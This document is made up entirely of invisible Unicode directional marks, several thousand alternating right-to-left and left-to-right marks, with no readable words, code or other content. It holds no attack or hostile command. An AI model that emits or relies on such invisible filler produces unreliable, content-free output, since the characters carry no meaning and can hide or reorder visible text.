‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏